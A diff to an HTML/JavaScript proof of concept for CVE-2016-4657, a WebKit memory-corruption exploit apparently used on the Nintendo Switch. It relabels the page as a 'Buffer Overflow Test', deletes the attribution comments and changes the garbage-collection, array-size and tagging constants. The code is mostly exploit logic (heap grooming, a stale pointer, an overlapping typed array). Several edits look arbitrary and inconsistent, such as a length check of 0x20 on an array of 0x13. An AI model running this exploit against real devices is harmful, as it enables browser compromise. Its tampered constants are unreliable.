@@ -9,7 +9,7 @@
         </style>
     </head>
     <body>
-        <h1>CVE-2016-4657 Nintendo Switch PoC</h1>
+        <h1>Nintendo Switch Buffer Overflow Test</h1>
         <ul>
             <li><a href='javascript:go();'>go!</a></li>
             <li><a href='javascript:document.location.reload();'>reload</a></li>
@@ -23,47 +23,39 @@
                 };
             </script>
             <script>
-                // based on jbme.qwertyoruiop.com
-                // Thanks to:
-                //  + qwertyoruiop
-                //  + Retr0id
-                //  + Ando
-                //
-                // saelo's phrack article is invaluable: http://www.phrack.org/papers/attacking_javascript_engines.html
-                // garbage collection stuff
                 var pressure = new Array(100);
                 // do garbage collect
                 dgc = function() {
                     for (var i = 0; i < pressure.length; i++) {
-                        pressure[i] = new Uint32Array(0x10000);
+                        pressure[i] = new Uint32Array(0x133733);
                     }
                     for (var i = 0; i < pressure.length; i++) {
                         pressure[i] = 0;
                     }
                 }
                 // access to the overlapping Uint32Array
-                var bufs = new Array(0x1000);
+                var bufs = new Array(0x2000);
                 // we will modify the vector of this
-                var smash = new Uint32Array(0x10);
+                var smash = new Uint32Array(0x13);
                 // the array with the stale pointer
                 var stale = 0;
                 var _dview = null;
                 // write 2x 32bit in a DataView and get the Float representation of it
                 function u2d(low, hi) {
-                    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
+                    if (!_dview) _dview = new DataView(new ArrayBuffer(32));
                     _dview.setUint32(0, hi);
                     _dview.setUint32(4, low);
                     return _dview.getFloat64(0);
                 }
                 function go_() {
                     // check if the length of the array smash changed already. if yes, bail out.
-                    if (smash.length != 0x10) return;
+                    if (smash.length != 0x20) return;
                     // garbage collect
                     dgc();
                     // new array with 0x100 elements
-                    var arr = new Array(0x100);
+                    var arr = new Array(0x1000);
                     // new array buffer of length 0x1000
-                    var yolo = new ArrayBuffer(0x1000);
+                    var yolo = new ArrayBuffer(0x10000);
                     // populate the arr with pointer to yolo and a number. not quite sure why.
                     arr[0] = yolo;
                     arr[1] = 0x13371337;
@@ -90,7 +82,7 @@
                                 // which is the Integer 0x41414141
                                 // phrack: Integer FFFF:0000:IIII:IIII
                                 bufs[i][k++] = 0x41414141;
-                                bufs[i][k++] = 0xffff0000;
+                                bufs[i][k++] = 0xffffff00;
                             }
                         }
                         return 10;
